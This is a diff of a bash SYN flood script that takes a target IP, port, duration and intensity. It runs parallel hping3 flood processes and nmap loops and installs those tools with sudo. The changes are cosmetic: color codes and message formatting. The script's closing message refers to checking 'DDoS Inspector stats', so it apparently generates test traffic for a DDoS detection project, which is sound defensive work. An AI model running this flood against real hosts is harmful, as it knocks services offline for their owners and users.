@@ -3,15 +3,23 @@
 # Efficient SYN Flood Attack Script
 # Uses more efficient methods to generate high packet rates
 
+# Color definitions
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
 TARGET_IP=${1:-"127.0.0.1"}
 TARGET_PORT=${2:-"80"}
 DURATION=${3:-"30"}
 INTENSITY=${4:-"high"}
 
-echo "🚀 Starting Efficient SYN Flood Attack"
-echo "Target: $TARGET_IP:$TARGET_PORT"
-echo "Duration: ${DURATION}s"
-echo "Intensity: $INTENSITY"
+echo -e "${GREEN}[START] Efficient SYN Flood Attack${NC}"
+echo "    Target: $TARGET_IP:$TARGET_PORT"
+echo "    Duration: ${DURATION}s"
+echo "    Intensity: $INTENSITY"
 
 case $INTENSITY in
     "low")
@@ -32,10 +40,10 @@ case $INTENSITY in
         ;;
 esac
 
-echo "📊 Attack Parameters:"
-echo "  - Rate: $RATE packets/second"
-echo "  - Parallel processes: $PARALLEL" 
-echo "  - Total packets: $((RATE * DURATION))"
+echo -e "${CYAN}[PARAMETERS] Attack Configuration:${NC}"
+echo "    - Rate: $RATE packets/second"
+echo "    - Parallel processes: $PARALLEL" 
+echo "    - Total packets: $((RATE * DURATION))"
 echo ""
 
 # Function to send efficient SYN flood using hping3 with burst mode
@@ -44,7 +52,7 @@ send_syn_flood_burst() {
     local packets_per_process=$((RATE / PARALLEL))
     local packets_per_second=$((packets_per_process))
     
-    echo "Process $process_id: Sending $packets_per_second packets/sec"
+    echo "    Process $process_id: Sending $packets_per_second packets/sec"
     
     # Use hping3 in flood mode with count and interval
     # -i u1000 = 1000 microseconds = 1ms interval = 1000 pps max per process
@@ -62,7 +70,7 @@ send_syn_flood_burst() {
 # Alternative method using nmap for comparison
 send_syn_flood_nmap() {
     local process_id=$1
-    echo "Process $process_id: Using nmap SYN scan method"
+    echo "    Process $process_id: Using nmap SYN scan method"
     
     # Use nmap with timing template for fast scanning
     for ((i=0; i<DURATION; i++)); do
@@ -73,19 +81,19 @@ send_syn_flood_nmap() {
 
 # Check if hping3 is installed
 if ! command -v hping3 &> /dev/null; then
-    echo "⚠️  hping3 not found. Installing..."
+    echo -e "${YELLOW}[WARNING] hping3 not found. Installing...${NC}"
     sudo apt-get update && sudo apt-get install -y hping3
 fi
 
 # Check if nmap is installed
 if ! command -v nmap &> /dev/null; then
-    echo "⚠️  nmap not found. Installing..."
+    echo -e "${YELLOW}[WARNING] nmap not found. Installing...${NC}"
     sudo apt-get update && sudo apt-get install -y nmap
 fi
 
-echo "🎯 Starting efficient SYN flood attack..."
-echo "⏱️  This will run for $DURATION seconds"
-echo "🔥 Using hping3 flood mode for maximum efficiency"
+echo -e "${BLUE}[ATTACK] Starting efficient SYN flood attack...${NC}"
+echo -e "${YELLOW}[TIMING] This will run for $DURATION seconds${NC}"
+echo -e "${RED}[METHOD] Using hping3 flood mode for maximum efficiency${NC}"
 
 # Start parallel attack processes
 PIDS=()
@@ -96,7 +104,7 @@ done
 
 # Monitor attack progress
 start_time=$(date +%s)
-echo "📊 Monitoring attack progress..."
+echo -e "${CYAN}[MONITORING] Attack progress...${NC}"
 
 while true; do
     current_time=$(date +%s)
@@ -109,12 +117,12 @@ while true; do
     # Show progress
     remaining=$((DURATION - elapsed))
     estimated_packets=$((RATE * elapsed))
-    echo "⏳ Attack in progress... ${remaining}s remaining (targeting ~$estimated_packets packets)"
+    echo -e "${YELLOW}[PROGRESS] Attack in progress... ${remaining}s remaining (targeting ~$estimated_packets packets)${NC}"
     sleep 2
 done
 
 # Clean up background processes
-echo "🛑 Stopping attack processes..."
+echo -e "${RED}[STOPPING] Stopping attack processes...${NC}"
 for pid in "${PIDS[@]}"; do
     kill $pid 2>/dev/null || true
 done
@@ -123,9 +131,9 @@ done
 pkill -f "hping3.*$TARGET_IP" 2>/dev/null || true
 sleep 2
 
-echo "✅ Efficient SYN flood attack completed"
-echo "📈 Targeted packets: ~$((RATE * DURATION))"
-echo "🔍 Check your DDoS Inspector stats for actual detection"
+echo -e "${GREEN}[SUCCESS] Efficient SYN flood attack completed${NC}"
+echo -e "${CYAN}[STATS] Targeted packets: ~$((RATE * DURATION))${NC}"
+echo -e "${BLUE}[CHECK] Check your DDoS Inspector stats for actual detection${NC}"
 echo ""
-echo "💡 This script should generate much higher packet rates"
-echo "   Check the stats file to see if packet counts increased significantly"
+echo -e "${YELLOW}[INFO] This script should generate much higher packet rates${NC}"
+echo "       Check the stats file to see if packet counts increased significantly"
